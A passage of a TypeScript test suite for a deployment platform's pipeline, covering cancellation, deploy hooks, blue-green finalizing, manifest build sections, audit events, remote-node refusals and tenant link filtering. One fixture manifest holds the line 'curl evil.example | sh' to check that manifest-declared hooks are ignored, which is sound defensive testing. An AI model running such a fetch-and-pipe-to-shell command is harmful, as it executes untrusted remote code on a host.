    db.query.deployments.findFirst
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValue({ ...dep, status: 'cancelled' });
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'new-c', port: 3000, healthPath: '/' }));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    // The healthcheck ran; the success path never executed.
    expect(lines.join('\n')).toContain('Running healthcheck');
    expect(lines.join('\n')).toContain('⏹ Deployment cancelled');
    expect(lines.join('\n')).not.toContain('✓ Deployment successful');
  });

  it('a finalize-race cancel without a previous runtime leaves the service untouched', async () => {    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', runtimeId: null });
    db.query.deployments.findFirst.mockResolvedValue(dep);
    const dbAny = db as unknown as {
      update: (t: unknown) => { set: (v: Record<string, unknown>) => { where: () => { returning: () => Promise<unknown[]> } } };
    };
    const origUpdate = dbAny.update.bind(dbAny);
    dbAny.update = ((table: unknown) => {
      const builder = origUpdate(table);
      return {
        set: (values: Record<string, unknown>) => {
          const inner = builder.set(values);
          if (values.status === 'running' && 'imageDigest' in values) {
            return { where: () => ({ returning: () => Promise.resolve([]) }) };
          }
          return inner;
        },
      };
    }) as typeof dbAny.update;
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'new-c', port: 3000, healthPath: '/' }));
    // A failing stop must be swallowed by the cancellation cleanup path.
    h.builder.stop.mockRejectedValueOnce(new Error('docker gone'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines.join('\n')).toContain('Cancelled just before finalizing');
    expect(h.builder.stop).toHaveBeenCalledWith('new-c');
  });

  it('executes preDeployCmd, postDeployCmd and preStopCmd hooks during deployment', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', runtimeId: 'old-c' });
    db.query.deployments.findFirst.mockResolvedValue(dep);
    const configRow = {
      id: 1,
      serviceId: 5,
      buildPack: 'auto',
      baseDir: '/',
      installCmd: null,
      buildCmd: null,
      startCmd: null,
      dockerfilePath: null,
      preDeployCmd: 'npm run db:migrate',
      postDeployCmd: 'curl -sSL http://localhost/warmup',
      preStopCmd: 'npm run drain',
      restartPolicy: 'unless-stopped',
      stopGraceSeconds: 5,
      createdAt: new Date(0),
      updatedAt: new Date(0),
    };
    db.query.buildConfigs.findFirst.mockResolvedValue(configRow);

    const lines = collectLogs(1);
    await runDeployment(db as never, 1);

    expect(execMock.run).toHaveBeenCalledWith(
      'npm',
      ['run', 'db:migrate'],
      expect.any(Object),
      expect.any(Function),
    );
    expect(execMock.run).toHaveBeenCalledWith(
      'curl',
      ['-sSL', 'http://localhost/warmup'],
      expect.any(Object),
      expect.any(Function),
    );
    expect(execMock.run).toHaveBeenCalledWith(
      'npm',
      ['run', 'drain'],
      expect.any(Object),
      expect.any(Function),
    );
    expect(lines.join('\n')).toContain('Running Pre-Deploy Hook: npm run db:migrate');
    expect(lines.join('\n')).toContain('Running Post-Deploy Hook: curl -sSL http://localhost/warmup');
    expect(lines.join('\n')).toContain('Running Pre-Stop Hook: npm run drain');
    // Pre-deploy hook failure causes deploy to fail and rollback
    execMock.run.mockRejectedValueOnce(new Error('migration failed'));
    await runDeployment(db as never, 1);
    expect(lines.join('\n')).toContain('✗ Deployment failed: migration failed');

    // Post-deploy hook failure is logged but does not fail the deploy
    execMock.run.mockResolvedValueOnce({ stdout: '', stderr: '' });
    execMock.run.mockRejectedValueOnce(new Error('warmup timed out'));
    await runDeployment(db as never, 1);
    expect(lines.join('\n')).toContain('warning: post-deploy hook failed: warmup timed out');

    // Pre-stop hook failure is logged as warning during finalize
    execMock.run.mockResolvedValueOnce({ stdout: '', stderr: '' }); // pre-deploy ok
    execMock.run.mockResolvedValueOnce({ stdout: '', stderr: '' }); // post-deploy ok
    execMock.run.mockRejectedValueOnce(new Error('drain failed')); // pre-stop fails
    await runDeployment(db as never, 1);
    expect(lines.join('\n')).toContain('pre-stop warning: drain failed');

    // Whitespace hook command returns early
    configRow.preDeployCmd = '   ';
    await runDeployment(db as never, 1);
  });
});

describe('runDeployment finalize: blue-green vs in-place redeploys', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.config.wildcardDomain = '';
    h.builder.isHealthy.mockImplementation(async () => true);
    h.builder.stop.mockImplementation(async () => undefined);
    h.checkoutCommit.mockImplementation(async () => 'sha-1234567');
    h.writeDynamicConfig.mockImplementation(async () => undefined);
  });

  afterEach(() => {
    logBus.removeAllListeners();
  });

  it('an in-place redeploy (compose) must NOT retire the runtime id that just went live', async () => {
    const { db, updates } = makeDb();
    // The service row still carries the deterministic compose runtime id and
    // buildAndRun recreates containers under that SAME id — "previous" and
    // "new" are one live instance.
    baseSetup(db, { type: 'docker', status: 'running', runtimeId: 'ndcmp-stack-api-1' });
    h.builder.buildAndRun.mockImplementation(async () => ({
      runtimeId: 'ndcmp-stack-api-1',
      port: 3000,
      healthPath: '/',
    }));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.writeDynamicConfig).toHaveBeenCalled();
    expect(h.builder.stop).not.toHaveBeenCalled();
    expect(lines).toContain('In-place redeploy: the live instance carries the new version — nothing to retire');
    const svcRunning = updates.filter((u) => u.table === services && u.values.status === 'running').at(-1);
    expect(svcRunning?.values.runtimeId).toBe('ndcmp-stack-api-1');
  });

  it('blue-green finalizes still retire the previous container after routing flips', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { type: 'docker', status: 'running', runtimeId: 'c-old' });
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-new', port: 3000, healthPath: '/' }));

    await runDeployment(db as never, 1);

    expect(h.writeDynamicConfig).toHaveBeenCalled();
    expect(h.builder.stop).toHaveBeenCalledWith('c-old', { graceSeconds: undefined });
    expect(h.builder.stop).not.toHaveBeenCalledWith('c-new', expect.anything());
    const svcRunning = updates.filter((u) => u.table === services && u.values.status === 'running').at(-1);
    expect(svcRunning?.values.runtimeId).toBe('c-new');
  });
});

// ── `.ninedeploy` build-shaping sections ───────────────────────────────────
//
// Until 0.3.5 the pipeline applied only the manifest's OPERATIONAL sections
// (routes/database/alerts) and dropped `build`, `run`, `resources` and
// `env.required` on the floor, even though the schema, the CLI validator and
// the web Manifest Creator all accepted them.
describe('runDeployment applies the .ninedeploy build sections', () => {
  /** Write a manifest (one YAML line per array entry) into the work dir. */
  function writeManifest(lines: string[]) {
    const dir = path.join(reposDir, '5');
    mkdirSync(dir, { recursive: true });
    writeFileSync(path.join(dir, '.ninedeploy'), lines.join('\n'), 'utf8');
  }

  const BUILD_CONFIG = {
    id: 1,
    serviceId: 5,
    buildPack: 'auto',
    baseDir: '/',
    installCmd: null,
    buildCmd: null,
    startCmd: null,
    dockerfilePath: null,
    preDeployCmd: null,
    postDeployCmd: null,
    preStopCmd: null,
    restartPolicy: 'unless-stopped',
    stopGraceSeconds: 5,
  };

  const repoService = { image: null, repoUrl: 'https://example.test/app.git' };

  it('folds build commands into the BuildContext and hands the manifest to the builder', async () => {
    writeManifest(['version: "1"', 'build:', '  install: npm ci', '  start: node server.js']);
    const { db } = makeDb();
    baseSetup(db, repoService);
    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as {
      buildConfig: Record<string, unknown>;
      manifest?: Record<string, unknown>;
    };
    expect(ctx.buildConfig).toMatchObject({ installCmd: 'npm ci', startCmd: 'node server.js' });
    // The raw manifest travels too: `runtime`/`phases` cannot be expressed as
    // a BuildConfig and are rendered into nixpacks.toml by the builder.
    expect(ctx.manifest).toMatchObject({ version: '1' });
    expect(lines.some((l) => l.includes('.ninedeploy build config'))).toBe(true);
  });

  it('lets a panel value win over the manifest', async () => {
    writeManifest(['version: "1"', 'build:', '  install: npm ci']);
    const { db } = makeDb();
    baseSetup(db, repoService);
    db.query.buildConfigs.findFirst.mockResolvedValue({ ...BUILD_CONFIG, installCmd: 'pnpm i' });

    await runDeployment(db as never, 1);

    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { buildConfig: Record<string, unknown> };
    expect(ctx.buildConfig.installCmd).toBe('pnpm i');
  });

  it('fills resources and run.port only where the panel left them unset', async () => {
    writeManifest([
      'version: "1"',
      'run:',
      '  port: 8080',
      '  healthcheck: /healthz',
      'resources:',
      '  cpuShares: 512',
      '  cpuLimitMilli: 250',
      '  memMb: 256',
      '  replicas: 2',
    ]);
    const { db } = makeDb();
    baseSetup(db, { ...repoService, port: null, healthPath: '/', cpuShares: 0, cpuLimitMilli: 0, memLimitMb: 0, replicas: 1 });
    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { service: Record<string, unknown> };
    expect(ctx.service).toMatchObject({ port: 8080, healthPath: '/healthz', cpuShares: 512, cpuLimitMilli: 250, memLimitMb: 256, replicas: 2 });
    expect(lines.some((l) => l.includes('.ninedeploy runtime config'))).toBe(true);
  });

  it('leaves panel-set resources and port alone', async () => {
    writeManifest(['version: "1"', 'run:', '  port: 8080', 'resources:', '  cpuShares: 512']);
    const { db } = makeDb();
    baseSetup(db, { ...repoService, port: 3000, cpuShares: 1024, memLimitMb: 512 });
    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);

    await runDeployment(db as never, 1);

    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { service: Record<string, unknown> };
    expect(ctx.service).toMatchObject({ port: 3000, cpuShares: 1024, memLimitMb: 512 });
  });

  it('refuses manifest-declared lifecycle hooks and says why', async () => {
    writeManifest(['version: "1"', 'hooks:', '  preBuild: curl evil.example | sh']);
    const { db } = makeDb();
    baseSetup(db, repoService);
    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { buildConfig: Record<string, unknown> };
    expect(ctx.buildConfig.preDeployCmd).toBeNull();
    expect(lines.some((l) => l.includes('hooks are ignored'))).toBe(true);
  });

  it('warns about a declared required env var that is not set', async () => {
    // The classic "container boots, then crashes" failure. Warned rather than
    // failed: the value may legitimately come from the image itself.
    writeManifest(['version: "1"', 'env:', '  required:', '    - API_KEY']);
    const { db } = makeDb();
    baseSetup(db, repoService);
    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines.some((l) => l.includes('required env "API_KEY"'))).toBe(true);
    // A warning must not stop the deploy.
    expect(lines).toContain('✓ Deployment successful');
  });

  it('r602: an invalid previews.pattern is skipped with a deploy-log note; the rest applies and the deploy succeeds', async () => {
    writeManifest(['version: "1"', 'previews:', '  enabled: true', '  pattern: "victim-{n}.{{domain}}"', '  maxActive: 4']);
    const { db, updates } = makeDb();
    baseSetup(db, repoService);
    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const previewWrite = updates.find((u) => u.table === services && 'previewMaxActive' in u.values);
    expect(previewWrite?.values).toMatchObject({ previewDeploymentsEnabled: true, previewMaxActive: 4 });
    expect(previewWrite?.values).not.toHaveProperty('previewDomainPattern');
    expect(lines.some((l) => l.includes('.ninedeploy note: previews.pattern') && l.includes('{{pr}} and {{slug}}'))).toBe(true);
    expect(lines).toContain('✓ Deployment successful');
  });
});

/**
 * Regression guard: a deploy's OUTCOME reaches the audit stream.
 *
 * `deploy.trigger` is written by the route when the deployment is queued, and
 * for a long time it was the only deploy action anything emitted — the pipeline
 * finished, succeeded or failed, in silence. Everything downstream of `audit()`
 * was blind to the result: notification channels (so a failed production deploy
 * paged nobody), the `/v1/events` activity feed, and `kernel/auditBridge`, whose
 * `deployment.status_changed` could therefore only ever carry `trigger`.
 */
describe('runDeployment audits the outcome', () => {
  const OWNER = 42;

  /** Audit rows the pipeline wrote, in order. */
  function auditRows(inserts: { table: unknown; values: Record<string, unknown> }[]) {
    return inserts.filter((i) => i.table === auditLog).map((i) => i.values);
  }

  it('records deploy.success with the service name and deployment id', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: OWNER });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✓ Deployment successful');
    // `name #id` is the entity shape kernel/auditBridge decomposes back into
    // { serviceName, deploymentId }.
    expect(auditRows(inserts)).toEqual([
      { userId: OWNER, action: 'deploy.success', entity: 'Web #1', meta: { serviceId: 5 } },
    ]);
  });

  it('records deploy.failed with the reason when the build throws', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: OWNER });
    h.builder.buildAndRun.mockRejectedValueOnce(new Error('image pull failed'));
    collectLogs(1);

    await runDeployment(db as never, 1);

    expect(auditRows(inserts)).toEqual([
      { userId: OWNER, action: 'deploy.failed', entity: 'Web #1', meta: { reason: 'image pull failed', serviceId: 5 } },
    ]);
  });

  it('records deploy.cancelled without a reason', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: OWNER });
    // The first cancel checkpoint reads the deployment row back.
    db.query.deployments.findFirst
      .mockResolvedValueOnce(dep)
      .mockResolvedValue({ ...dep, status: 'cancelled' });
    collectLogs(1);

    await runDeployment(db as never, 1);

    expect(auditRows(inserts)).toEqual([
      { userId: OWNER, action: 'deploy.cancelled', entity: 'Web #1', meta: { serviceId: 5 } },
    ]);
  });

  it('falls back to a null actor when the service has no owner', async () => {
    // `ownerUserId` is nullable (ON DELETE SET NULL). A null actor makes the
    // event operator-only on the /v1/events socket, which is the safe default.
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: null });
    collectLogs(1);

    await runDeployment(db as never, 1);

    expect(auditRows(inserts)[0]).toMatchObject({ userId: null, action: 'deploy.success' });
  });

  it('records deploy.failed for an unknown service type', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: OWNER, type: 'nonsense' });
    collectLogs(1);

    await runDeployment(db as never, 1);

    expect(auditRows(inserts)).toEqual([
      { userId: OWNER, action: 'deploy.failed', entity: 'Web #1', meta: { reason: 'Unknown service type: nonsense', serviceId: 5 } },
    ]);
  });
});

describe('runDeployment with an inline compose stack', () => {
  const stack = [
    'services:',
    '  app:',
    '    image: nginx:alpine',
  ].join('\n');

  it('skips the git checkout and rewrites the compose file from the service row', async () => {
    const { db } = makeDb();
    // An inline stack has no repository and no image: without the
    // composeContent branch, PREPARE would call checkoutCommit('') and the
    // deploy would die before the builder ever ran.
    baseSetup(db, { type: 'compose', repoUrl: null, image: null, composeContent: stack, composeService: 'app' });
    collectLogs(1);
    // Mocks are file-scoped and this suite runs last; clear the history so the
    // "never checked out" assertion is about THIS deployment.
    h.checkoutCommit.mockClear();
    h.builder.buildAndRun.mockClear();

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).not.toHaveBeenCalled();
    // The workspace copy is a cache of the row — asserting the FILE (not just
    // that a helper exists) is what proves the pipeline is actually wired to
    // rewrite it before every deploy.
    const written = readFileSync(path.join(reposDir, '5', 'docker-compose.yml'), 'utf8');
    expect(written).toBe(stack);
    expect(h.builder.buildAndRun).toHaveBeenCalled();
  });

  it('repairs a workspace whose compose file was deleted between deploys', async () => {
    const { db } = makeDb();
    baseSetup(db, { type: 'compose', repoUrl: null, image: null, composeContent: stack, composeService: 'app' });
    collectLogs(1);
    rmSync(path.join(reposDir, '5'), { recursive: true, force: true });

    await runDeployment(db as never, 1);

    expect(readFileSync(path.join(reposDir, '5', 'docker-compose.yml'), 'utf8')).toBe(stack);
  });
});

describe('runDeployment on a remote-server target', () => {
  /**
   * Make the mocked agent answer `docker.inspect --format health` with a
   * running container, so the remote builder's state-based health check
   * settles instead of polling to its deadline (r265: it needs a few stable
   * samples, a poll apart).
   */
  const agentAnswersRunning = () => {
    h.agentOp.mockImplementation(async (_db: unknown, _serverId: unknown, op: string) =>
      op === 'docker.inspect'
        ? { exitCode: 0, lines: ['running|none|0|0'] }
        : { exitCode: 0, lines: [] },
    );
  };

  /**
   * r037. `server_id` existed on the services table, on the Servers page and
   * in the BuildContext, and no builder read it — so a service pinned to a
   * node would have been built and started on the PANEL host while the panel
   * reported the node. It is now routed through the node's agent.
   */
  it('runs a docker service through the node agent, never the local builder', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', serverId: 4 });
    collectLogs(1);
    h.builder.buildAndRun.mockClear();
    agentAnswersRunning();

    await runDeployment(db as never, 1);

    // The LOCAL docker builder must not have touched this deployment.
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();

    const ops = h.agentOp.mock.calls.map((c) => (c as unknown[])[2] as string);
    expect(ops).toContain('docker.pull');
    expect(ops).toContain('file.writeEnv');
    expect(ops).toContain('docker.runEnv');
    // Every call is addressed to the node the service is pinned to.
    for (const call of h.agentOp.mock.calls) {
      expect((call as unknown[])[1]).toBe(4);
    }
  });

  it('deletes the env file from the node after the container has taken it', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', serverId: 4 });
    collectLogs(1);
    agentAnswersRunning();

    await runDeployment(db as never, 1);

    const ops = h.agentOp.mock.calls.map((c) => (c as unknown[])[2] as string);
    // Leaving decrypted service secrets on the node's disk after `docker run`
    // has consumed them is pure exposure.
    expect(ops.indexOf('file.deleteEnv')).toBeGreaterThan(ops.indexOf('docker.runEnv'));
  });

  it('r229: refuses a database-attached service on a node — the DB host only resolves on the panel', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: 42, image: 'nginx:latest', serverId: 4 });
    db.query.databaseAttachments.findMany.mockResolvedValue([{ serviceId: 1, databaseId: 2, envAlias: 'DATABASE_URL' }]);
    const lines = collectLogs(1);
    h.agentOp.mockClear();

    await runDeployment(db as never, 1);

    expect(h.agentOp).not.toHaveBeenCalled();
    expect(lines.join(' ')).toMatch(/does not resolve on the node/);
    const audits = inserts.filter((i) => i.table === auditLog).map((i) => i.values);
    expect(audits[0]).toMatchObject({ action: 'deploy.failed' });
  });

  it('r266: refuses a template container the agent cannot start as the panel would (cmd / docker socket)', async () => {
    // Multi-node (T5, via remoteServiceRefusal): refused only for an agent
    // without `docker.runSpec` — an older agent answers the ping with no
    // capabilities, so it is asked that and nothing else.
    for (const shape of [{ cmd: ['server', '/data'] }, { dockerSocket: true }]) {
      const { db, inserts } = makeDb();
      baseSetup(db, { ownerUserId: 42, image: 'minio/minio:latest', serverId: 4, ...shape });
      const lines = collectLogs(1);
      agentAnswersRunning();
      h.agentOp.mockClear();

      await runDeployment(db as never, 1);

      // Nothing runs on the node: the container would have started without
      // its command / socket and "deployed" broken.
      expect(h.agentOp.mock.calls.map((c) => c[2])).toEqual(['agent.ping']);
      expect(lines.join(' ')).toMatch(/cannot run a service with volume attachments, a command or the Docker socket/);
      const audits = inserts.filter((i) => i.table === auditLog).map((i) => i.values);
      expect(audits[0]).toMatchObject({ action: 'deploy.failed' });
      logBus.removeAllListeners();
    }
  });

  it('r266 relaxed: an agent advertising docker.runSpec (sealed) runs the same container as the panel would', async () => {
    for (const shape of [{ cmd: ['server', '/data'] }, { dockerSocket: true }]) {
      const { db } = makeDb();
      baseSetup(db, { ownerUserId: 42, image: 'minio/minio:latest', serverId: 4, ...shape });
      const lines = collectLogs(1);
      h.agentTransportSealed.mockResolvedValue(true);
      h.agentOp.mockImplementation(async (_db: unknown, _serverId: unknown, op: string) =>
        op === 'agent.ping'
          ? { exitCode: 0, lines: [`ND-AGENT ${JSON.stringify({ version: '0.15.2', caps: ['build-path-guard', 'workspace.remove', 'git.credential', 'terminal', 'docker.runSpec', 'volume.manage'] })}`] }
          : op === 'docker.inspect'
            ? { exitCode: 0, lines: ['running|none|0|0'] }
            : { exitCode: 0, lines: [] },
      );
      h.agentOp.mockClear();

      await runDeployment(db as never, 1);

      expect(lines.join(' ')).not.toMatch(/cannot run a service with volume attachments, a command or the Docker socket/);
      // Past the refusal: the node pulls and starts the release.
      expect(h.agentOp.mock.calls.map((c) => c[2])).toContain('docker.pull');
      logBus.removeAllListeners();
    }
  });

  it('r269: refuses a DB-backed template on a node before the database is provisioned', async () => {
    const { db } = makeDb();
    baseSetup(db, {
      ownerUserId: 42,
      image: 'ghost:5',
      serverId: 4,
      templateId: 'ghost',
      templateDatabaseEnv: { database__connection__host: 'host' },
    });
    const lines = collectLogs(1);
    agentAnswersRunning();
    h.agentOp.mockClear();
    h.reconcileTemplateDependencies.mockClear();

    await runDeployment(db as never, 1);

    // The attachment does not exist yet on the first deploy — it is created by
    // the reconcile below the refusal — so r229's attachment check passed and
    // the node deployed green against a panel-local database host.
    expect(h.reconcileTemplateDependencies).not.toHaveBeenCalled();
    expect(h.agentOp).not.toHaveBeenCalled();
    expect(lines.join(' ')).toMatch(/provisions a managed database/);
  });

  it('r269: a database attached during the deploy still stops it before the node runs anything', async () => {
    const { db } = makeDb();
    // A template row that predates `templateDatabaseEnv`: only the reconcile
    // reveals (and creates) the database attachment.
    baseSetup(db, { ownerUserId: 42, image: 'ghost:5', serverId: 4, templateId: 'ghost', templateDatabaseEnv: null });
    const lines = collectLogs(1);
    agentAnswersRunning();
    h.agentOp.mockClear();
    h.reconcileTemplateDependencies.mockImplementationOnce(async () => {
      db.query.databaseAttachments.findMany.mockResolvedValue([{ serviceId: 5, databaseId: 2, envAlias: 'DATABASE_URL' }]);
      return { database: { slug: 'ghost-db' }, alreadyAttached: false };
    });

    await runDeployment(db as never, 1);

    const ops = h.agentOp.mock.calls.map((c) => (c as unknown[])[2] as string);
    expect(ops).not.toContain('docker.runEnv');
    expect(lines.join(' ')).toMatch(/does not resolve on the node/);
  });

  it('r268: refuses a private repository on a node before the panel even clones it', async () => {
    const { db } = makeDb();
    baseSetup(db, { ownerUserId: 42, serverId: 4, sourceId: 3, repoUrl: 'https://github.com/acme/private.git' });
    db.query.sources.findFirst.mockResolvedValue({ id: 3, type: 'github', tokenEncrypted: 'enc' });
    const lines = collectLogs(1);
    agentAnswersRunning();
    h.agentOp.mockClear();
    h.checkoutCommit.mockClear();

    await runDeployment(db as never, 1);

    expect(h.agentOp).not.toHaveBeenCalled();
    expect(h.checkoutCommit).not.toHaveBeenCalled();
    expect(lines.join(' ')).toMatch(/node clones anonymously/);
  });

  it('refuses a pm2 service on a node instead of running it on the panel host', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: 42, type: 'pm2', serverId: 4 });
    const lines = collectLogs(1);
    h.builder.buildAndRun.mockClear();
    h.agentOp.mockClear();

    await runDeployment(db as never, 1);

    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    expect(h.agentOp).not.toHaveBeenCalled();
    expect(lines.join('\n')).toMatch(/host processes/);

    const audits = inserts.filter((i) => i.table === auditLog).map((i) => i.values);
    expect(audits).toHaveLength(1);
    expect(audits[0]).toMatchObject({ userId: 42, action: 'deploy.failed' });
    expect((audits[0]!['meta'] as { reason: string }).reason).toMatch(/not available for this service/);
  });

  it('brings a compose stack up on the node through the agent', async () => {
    const { db } = makeDb();
    baseSetup(db, { type: 'compose', serverId: 4, composeContent: 'services: {}' });
    collectLogs(1);
    h.builder.buildAndRun.mockClear();
    // The compose builder waits on the container's HEALTH format, not `state`.
    h.agentOp.mockImplementation(async (_db: unknown, _serverId: unknown, op: string) =>
      op === 'docker.inspect'
        ? { exitCode: 0, lines: ['running|healthy|0|0'] }
        : { exitCode: 0, lines: [] },
    );

    await runDeployment(db as never, 1);

    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    const ops = h.agentOp.mock.calls.map((c) => (c as unknown[])[2] as string);
    // Preflight BEFORE `up`: a broken interpolation or a bad tag must fail the
    // deployment without ever having torn the live stack down.
    expect(ops.indexOf('docker.composeConfig')).toBeLessThan(ops.indexOf('docker.composeUp'));
    expect(ops.indexOf('docker.composePull')).toBeLessThan(ops.indexOf('docker.composeUp'));
    expect(ops).toContain('file.writeWorkspace');
  });

  // r521: the node's proxy refresh was swallowed inside writeDynamicConfig,
  // so `routingFlipped` was always true for a node-pinned service and CLEANUP
  // stopped the previous container on the node while the node still routed
  // to it — an outage reported as a successful deploy.
  it('r521: a node proxy that could not take the new route fails the deploy and keeps the previous runtime', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest', serverId: 4, runtimeId: 'web-old', commitSha: 'oldsha1' });
    const lines = collectLogs(1);
    agentAnswersRunning();
    h.writeDynamicConfig.mockRejectedValue(new Error('the proxy on node #4 could not be updated: agent unreachable'));

    await runDeployment(db as never, 1);

    // The routing write is told which node MUST take it (and retried once).
    expect(h.writeDynamicConfig).toHaveBeenCalledWith(db, { requireNode: 4 });
    expect(h.writeDynamicConfig.mock.calls.filter((c) => (c as unknown[])[1] !== undefined)).toHaveLength(2);
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
    const revert = updates.find((u) => u.table === services && u.values.runtimeId === 'web-old');
    expect(revert?.values).toMatchObject({ status: 'running', commitSha: 'oldsha1' });
    // The still-routed previous container is NOT stopped on the node; the
    // unrouted new one is.
    const stops = h.agentOp.mock.calls
      .filter((c) => (c as unknown[])[2] === 'docker.stop')
      .map((c) => ((c as unknown[])[3] as { name: string }).name);
    expect(stops).not.toContain('web-old');
    expect(stops).toContain('web-1');
    expect(lines).not.toContain('✓ Deployment successful');
    h.writeDynamicConfig.mockImplementation(async () => undefined);
  });

  it('r521: a node proxy that took the route retires the previous runtime as before', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', serverId: 4, runtimeId: 'web-old' });
    const lines = collectLogs(1);
    agentAnswersRunning();

    await runDeployment(db as never, 1);

    expect(h.writeDynamicConfig).toHaveBeenCalledWith(db, { requireNode: 4 });
    expect(lines).toContain('✓ Deployment successful');
    const stops = h.agentOp.mock.calls
      .filter((c) => (c as unknown[])[2] === 'docker.stop')
      .map((c) => ((c as unknown[])[3] as { name: string }).name);
    expect(stops).toContain('web-old');
  });

  // r522: runHook runs on the PANEL host; a node-pinned service's hooks ran
  // on the wrong machine while the deploy reported success.
  it('r522: refuses deploy hooks on a node-pinned service before anything runs, naming the fix', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: 42, image: 'nginx:latest', serverId: 4 });
    db.query.buildConfigs.findFirst.mockResolvedValue({ buildPack: 'auto', preDeployCmd: 'npm run migrate', postDeployCmd: null, preStopCmd: '' });
    const lines = collectLogs(1);
    h.agentOp.mockClear();
    execMock.run.mockClear();

    await runDeployment(db as never, 1);

    expect(h.agentOp).not.toHaveBeenCalled();
    // The hook never ran on the panel host either.
    expect(execMock.run).not.toHaveBeenCalled();
    const text = lines.join(' ');
    expect(text).toMatch(/pre-deploy hook runs on the panel host/);
    expect(text).toMatch(/Clear the hook in Service → Settings → Build, or clear the target server/);
    const audits = inserts.filter((i) => i.table === auditLog).map((i) => i.values);
    expect(audits[0]).toMatchObject({ action: 'deploy.failed' });
  });

  it('still deploys a service with no server assigned', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', serverId: null });
    collectLogs(1);
    h.builder.buildAndRun.mockClear();
    h.agentOp.mockClear();

    await runDeployment(db as never, 1);

    expect(h.builder.buildAndRun).toHaveBeenCalled();
    expect(h.agentOp).not.toHaveBeenCalled();
  });
});

/**
 * The route layer refuses cross-tenant project tags; this is the pipeline-side
 * backstop that keeps a link nobody validated from decrypting another
 * workspace's shared env into a container (engine/pipeline.ts
 * filterTrustworthyProjectLinks).
 */
describe('filterTrustworthyProjectLinks', () => {
  const links = [{ projectId: 4 }, { projectId: 9 }];
  const owner = { ownerUserId: 7 as number | null };

  /** `db.select()…` resolving to no rows: the owner holds no 0.15 access grant. */
  function noRows(): unknown {
    const chain: Record<string, unknown> = {};
    for (const k of ['from', 'innerJoin', 'leftJoin', 'where']) chain[k] = () => chain;
    // biome-ignore lint/suspicious/noThenProperty: an awaitable stand-in for a drizzle query.
    chain.then = (ok: (v: unknown[]) => unknown) => Promise.resolve(ok([]));
    return chain;
  }

  function spyDb() {
    return {
      select: noRows,
      query: {
        users: { findFirst: vi.fn().mockResolvedValue({ id: 7, isInstanceOperator: false }) },
        // Default: the requested project lives in workspace #1. Individual
        // tests override this for the NULL-workspace case.
        projects: { findFirst: vi.fn().mockResolvedValue({ id: 4, workspaceId: 1 }) },
        workspaceMembers: {
          findFirst: vi.fn(async () => null as null | { workspaceId: number; role: string }),
        },
      },
    };
  }

  it('keeps links into workspaces the owner holds a member+ seat in', async () => {
    for (const role of ['member', 'admin', 'owner']) {
      const db = spyDb();
      db.query.workspaceMembers.findFirst.mockResolvedValue({ workspaceId: 1, role });
      const kept = await filterTrustworthyProjectLinks(db as never, owner, [{ projectId: 4 }]);
      expect(kept, role).toEqual([{ projectId: 4 }]);
    }
  });

  it('drops links when the owner only holds a viewer seat (r095)', async () => {
    // A viewer is read-only and never sees secret values through the API; a
    // viewer-seat link must not decrypt the project's shared env into a
    // container the viewer's own code runs in.
    const db = spyDb();
    db.query.workspaceMembers.findFirst.mockResolvedValue({ workspaceId: 1, role: 'viewer' });
    const kept = await filterTrustworthyProjectLinks(db as never, owner, [{ projectId: 4 }]);
    expect(kept).toEqual([]);
  });

  it('drops links into workspaces the owner cannot see', async () => {
    const db = spyDb();
    // Project 4 exists, but the owner holds no seat in its workspace.
    const kept = await filterTrustworthyProjectLinks(db as never, owner, [{ projectId: 4 }]);
    expect(kept).toEqual([]);
  });

